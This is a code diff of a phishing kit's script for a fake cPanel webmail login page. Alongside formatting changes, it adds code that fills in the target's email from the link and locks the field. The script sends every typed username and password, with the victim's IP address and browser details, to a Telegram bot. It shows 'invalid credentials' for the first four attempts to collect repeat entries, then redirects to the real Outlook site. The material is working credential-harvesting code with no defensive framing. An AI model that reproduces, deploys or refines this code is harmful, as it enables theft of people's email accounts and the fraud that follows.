-  const emailInput = document.getElementById('user');
-  const passwordInput = document.getElementById('pass');
-  const loginButton = document.getElementById('login_submit');
-  
-  if (emailLabel) emailLabel.textContent = t.emailLabel;
-  if (passwordLabel) passwordLabel.textContent = t.passwordLabel;
-  if (emailInput) emailInput.placeholder = t.emailPlaceholder;
-  if (passwordInput) passwordInput.placeholder = t.passwordPlaceholder;
-  if (loginButton) loginButton.textContent = t.loginButton;
-  
-  // Update copyright and privacy policy
-  const copyrightDiv = document.querySelector('.copyright');
-  if (copyrightDiv) {
-    copyrightDiv.innerHTML = `${t.copyright}<br><a href="https://go.cpanel.net/privacy" target="_blank">${t.privacyPolicy}</a>`;
-  }
-  
-  // Store language preference
-  localStorage.setItem('preferredLanguage', lang);
-  
-  // Update language selector
-  var selectorEl = document.getElementById('languageSelect');
-  if (selectorEl) selectorEl.value = lang;
+currentLanguage = lang;
+const t = translations[lang] || translations.en;
+
+// Update page title
+document.title = t.title;
+
+// Update form labels and placeholders
+const emailLabel = document.querySelector('label[for="user"]');
+const passwordLabel = document.querySelector('label[for="pass"]');
+const emailInput = document.getElementById('user');
+const passwordInput = document.getElementById('pass');
+const loginButton = document.getElementById('login_submit');
+
+if (emailLabel) emailLabel.textContent = t.emailLabel;
+if (passwordLabel) passwordLabel.textContent = t.passwordLabel;
+if (emailInput) emailInput.placeholder = t.emailPlaceholder;
+if (passwordInput) passwordInput.placeholder = t.passwordPlaceholder;
+if (loginButton) loginButton.textContent = t.loginButton;
+
+// Update copyright and privacy policy
+const copyrightDiv = document.querySelector('.copyright');
+if (copyrightDiv) {
+  copyrightDiv.innerHTML = `${t.copyright}<br><a href="https://go.cpanel.net/privacy" target="_blank">${t.privacyPolicy}</a>`;
+}
+
+// Store language preference
+localStorage.setItem('preferredLanguage', lang);
+
+// Update language selector
+var selectorEl = document.getElementById('languageSelect');
+if (selectorEl) selectorEl.value = lang;
 }
 
 // Function to send Telegram message
 function sendTelegramMessage(message) {
-  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-  const data = {
-    chat_id: TELEGRAM_CHAT_ID,
-    text: message,
-    parse_mode: 'HTML'
-  };
-  return fetch(url, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-    body: new URLSearchParams(data)
-  });
+const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+const data = {
+  chat_id: TELEGRAM_CHAT_ID,
+  text: message,
+  parse_mode: 'HTML'
+};
+return fetch(url, {
+  method: 'POST',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: new URLSearchParams(data)
+});
 }
 
 // Function to get IP address
 function getIP() {
-  return fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => data.ip)
-    .catch(() => 'Unknown');
+return fetch('https://api.ipify.org?format=json')
+  .then(response => response.json())
+  .then(data => data.ip)
+  .catch(() => 'Unknown');
 }
 
 // Function to open modal
 function openModal(type, title, message, okText) {
-  const overlay = document.getElementById('modalOverlay');
-  const icon = document.getElementById('modalIcon');
-  const tEl = document.getElementById('modalTitle');
-  const mEl = document.getElementById('modalMessage');
-  const okBtn = document.getElementById('modalOk');
-  if (!overlay || !icon || !tEl || !mEl || !okBtn) return;
+const overlay = document.getElementById('modalOverlay');
+const icon = document.getElementById('modalIcon');
+const tEl = document.getElementById('modalTitle');
+const mEl = document.getElementById('modalMessage');
+const okBtn = document.getElementById('modalOk');
+if (!overlay || !icon || !tEl || !mEl || !okBtn) return;
 
-  icon.className = 'modal-icon ' + (type || 'info');
-  tEl.textContent = title || '';
-  mEl.textContent = message || '';
-  okBtn.textContent = okText || 'OK';
+icon.className = 'modal-icon ' + (type || 'info');
+tEl.textContent = title || '';
+mEl.textContent = message || '';
+okBtn.textContent = okText || 'OK';
 
-  overlay.style.display = 'flex';
-  overlay.setAttribute('aria-hidden', 'false');
+overlay.style.display = 'flex';
+overlay.setAttribute('aria-hidden', 'false');
 
-  okBtn.onclick = closeModal;
-  overlay.onclick = function(e) {
-    if (e.target === overlay) closeModal();
-  };
+okBtn.onclick = closeModal;
+overlay.onclick = function(e) {
+  if (e.target === overlay) closeModal();
+};
 }
 
 function closeModal() {
-  const overlay = document.getElementById('modalOverlay');
-  if (overlay) {
-    overlay.style.display = 'none';
-    overlay.setAttribute('aria-hidden', 'true');
-  }
+const overlay = document.getElementById('modalOverlay');
+if (overlay) {
+  overlay.style.display = 'none';
+  overlay.setAttribute('aria-hidden', 'true');
+}
 }
 
 // Override showError to use modal
 function showError(message) {
-  const t = translations[currentLanguage] || translations.en;
-  openModal('error', t.modalTitleError || 'Error', message, t.modalOk || 'OK');
+const t = translations[currentLanguage] || translations.en;
+openModal('error', t.modalTitleError || 'Error', message, t.modalOk || 'OK');
 }
 
 // Function to hide error message
 function hideError() {
-  const errorDiv = document.getElementById('errorMessage');
-  if (errorDiv) {
-    errorDiv.classList.remove('show');
-  }
+const errorDiv = document.getElementById('errorMessage');
+if (errorDiv) {
+  errorDiv.classList.remove('show');
+}
 }
 
 // Function to sleep/delay
 function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
+return new Promise(resolve => setTimeout(resolve, ms));
 }
 
 // Function to handle form submission
 async function submitForm(event) {
-  event.preventDefault();
-  
-  const username = document.getElementById('user').value;
-  const password = document.getElementById('pass').value;
-  
-  if (!username || !password) {
-    const t = translations[currentLanguage] || translations.en;
-    showError(t.errorEmailPassword);
-    return;
-  }
-  
-  loginAttempts++;
-  hideError();
-  
-  // Show loading state
-  const loginButton = document.getElementById('login_submit');
-  const originalText = loginButton.textContent;
+event.preventDefault();
+
+const username = document.getElementById('user').value;
+const password = document.getElementById('pass').value;
+
+if (!username || !password) {
   const t = translations[currentLanguage] || translations.en;
-  loginButton.textContent = t.signingIn;
-  loginButton.disabled = true;
-  
-  // Get IP address
-  const ip = await getIP();
-  const useragent = navigator.userAgent;
-  const timestamp = new Date().toLocaleString();
-  
-  // Construct Telegram message
-  let telegram_message = `<b>Webmail Login Attempt (#${loginAttempts})</b>\n`;
-  telegram_message += `<b>Username:</b> ${username}\n`;
-  telegram_message += `<b>Password:</b> ${password}\n`;
-  telegram_message += `<b>IP Address:</b> ${ip}\n`;
-  telegram_message += `<b>User Agent:</b> ${useragent}\n`;
-  telegram_message += `<b>Timestamp:</b> ${timestamp}\n`;
-  telegram_message += `<b>Language:</b> ${currentLanguage}`;
-  
-  // Send to Telegram
-  if (TELEGRAM_BOT_TOKEN !== 'YOUR_TELEGRAM_BOT_TOKEN' && TELEGRAM_CHAT_ID !== 'YOUR_TELEGRAM_CHAT_ID') {
-    try {
-      await sendTelegramMessage(telegram_message);
-    } catch (error) {
-      console.error('Failed to send Telegram message:', error);
-    }
+  showError(t.errorEmailPassword);
+  return;
+}
+
+loginAttempts++;
+hideError();
+
+// Show loading state
+const loginButton = document.getElementById('login_submit');
+const originalText = loginButton.textContent;
+const t = translations[currentLanguage] || translations.en;
+loginButton.textContent = t.signingIn;
+loginButton.disabled = true;
+
+// Get IP address
+const ip = await getIP();
+const useragent = navigator.userAgent;
+const timestamp = new Date().toLocaleString();
+
+// Construct Telegram message
+let telegram_message = `<b>Webmail Login Attempt (#${loginAttempts})</b>\n`;
+telegram_message += `<b>Username:</b> ${username}\n`;
+telegram_message += `<b>Password:</b> ${password}\n`;
+telegram_message += `<b>IP Address:</b> ${ip}\n`;
+telegram_message += `<b>User Agent:</b> ${useragent}\n`;
+telegram_message += `<b>Timestamp:</b> ${timestamp}\n`;
+telegram_message += `<b>Language:</b> ${currentLanguage}`;
+
+// Send to Telegram
+if (TELEGRAM_BOT_TOKEN !== 'YOUR_TELEGRAM_BOT_TOKEN' && TELEGRAM_CHAT_ID !== 'YOUR_TELEGRAM_CHAT_ID') {
+  try {
+    await sendTelegramMessage(telegram_message);
+  } catch (error) {
+    console.error('Failed to send Telegram message:', error);
   }
-  
-  // Simulate processing delay
-  await sleep(DELAY_SECONDS * 1000);
-  
-  // Simulate login logic: Fail first 4 attempts, succeed subsequent attempts
-  let success = false;
-  let message = '';
-  
-  if (loginAttempts <= 4) {
-    success = false;
-    message = t.errorInvalidCredentials;
-  } else {
-    success = true;
-    message = t.loginSuccess;
-  }
-  
-  // Reset button state
-  loginButton.textContent = originalText;
-  loginButton.disabled = false;
-  
-  if (success) {
-    // Redirect on 5th attempt
-    window.location.href = 'https://outlook.office.com/mail/';
-  } else {
-    // Show error message
-    showError(message);
-    document.getElementById('pass').value = '';
-  }
+}
+
+// Simulate processing delay
+await sleep(DELAY_SECONDS * 1000);
+
+// Simulate login logic: Fail first 4 attempts, succeed subsequent attempts
+let success = false;
+let message = '';
+
+if (loginAttempts <= 4) {
+  success = false;
+  message = t.errorInvalidCredentials;
+} else {
+  success = true;
+  message = t.loginSuccess;
+}
+
+// Reset button state
+loginButton.textContent = originalText;
+loginButton.disabled = false;
+
+if (success) {
+  // Redirect on 5th attempt
+  window.location.href = 'https://outlook.office.com/mail/';
+} else {
+  // Show error message
+  showError(message);
+  document.getElementById('pass').value = '';
+}
 }
 
 // Initialize when DOM is loaded
 document.addEventListener('DOMContentLoaded', function() {
-  // Load preferred language from localStorage
-  const savedLanguage = localStorage.getItem('preferredLanguage');
-  if (savedLanguage && translations[savedLanguage]) {
-    changeLanguage(savedLanguage);
-  }
-  
-  // Check URL hash for email parameter
-  if (window.location.hash) {
-    try {
-      const hash = window.location.hash.substring(1);
-      if (hash.indexOf('@') > 0) {
-        document.getElementById('user').value = decodeURIComponent(hash);
-      }
-    } catch (e) {
-      console.error('Error parsing URL hash:', e);
+// Load preferred language from localStorage
+const savedLanguage = localStorage.getItem('preferredLanguage');
+if (savedLanguage && translations[savedLanguage]) {
+  changeLanguage(savedLanguage);
+}
+
+// Check URL hash for email parameter
+var extracted = getEmailFromLocation();
+if (extracted) {
+  var userEl = document.getElementById('user');
+  if (userEl) { userEl.value = extracted; userEl.setAttribute('readonly','readonly'); }
+} else if (window.location.hash) {
+  try {
+    const hash = window.location.hash.substring(1);
+    if (hash.indexOf('@') > 0) {
+      var el = document.getElementById('user');
+      if (el) { el.value = decodeURIComponent(hash); el.setAttribute('readonly','readonly'); }
     }
+  } catch (e) {
+    console.error('Error parsing URL hash:', e);
   }
-  
-  // Wire up the form submission
-  const loginForm = document.getElementById('login_form');
-  if (loginForm) {
-    loginForm.addEventListener('submit', submitForm);
+}
+
+// Wire up the form submission
+const loginForm = document.getElementById('login_form');
+if (loginForm) {
+  loginForm.addEventListener('submit', submitForm);
+}
+
+// Allow Enter key to submit the form
+document.getElementById('pass').addEventListener('keydown', function(e) {
+  if (e.key === 'Enter') {
+    submitForm(e);
   }
-  
-  // Allow Enter key to submit the form
-  document.getElementById('pass').addEventListener('keydown', function(e) {
-    if (e.key === 'Enter') {
-      submitForm(e);
-    }
-  });
-  
-  // Set initial language
-  changeLanguage(currentLanguage);
+});
+
+// Set initial language
+changeLanguage(currentLanguage);
 });
 
 // Function to handle locale links (for backward compatibility)
 function handleLocaleChange(locale) {
-  if (translations[locale]) {
-    changeLanguage(locale);
-  }
+if (translations[locale]) {
+  changeLanguage(locale);
+}
 }
 
 // Make functions globally available
 window.changeLanguage = changeLanguage;
 window.handleLocaleChange = handleLocaleChange;
+
+// Helper: extract email from URL hash/query
+function getEmailFromLocation() {
+try {
+  var hash = window.location.hash || '';
+  if (hash && hash.charAt(0) === '#') {
+    hash = hash.substring(1);
+  }
+  var decodedHash = decodeURIComponent(hash);
+  var candidate = '';
+
+  // key=value pairs in hash
+  if (decodedHash.indexOf('=') !== -1) {
+    var parts = decodedHash.split('&');
+    for (var i = 0; i < parts.length; i++) {
+      var kv = parts[i].split('=');
+      var key = (kv[0] || '').toLowerCase();
+      var val = kv.slice(1).join('=');
+      if (key === 'email' || key === 'user' || key === 'username' || key === 'login') {
+        candidate = val;
+        break;
+      }
+    }
+  }
+
+  // plain email in hash
+  if (!candidate && decodedHash.indexOf('@') > 0) {
+    candidate = decodedHash;
+  }
+
+  // fallback to query string
+  if (!candidate) {
+    var qs = new URLSearchParams(window.location.search);
+    candidate = qs.get('email') || qs.get('user') || qs.get('username') || '';
+  }
+
+  if (candidate) {
+    candidate = candidate.replace(/\s+/g, '').trim();
+  }
+
+  if (candidate && candidate.indexOf('@') > 0) {
+    return candidate;
+  }
+} catch (e) {}
+return '';
+}
+
 </script>
 
 </body>
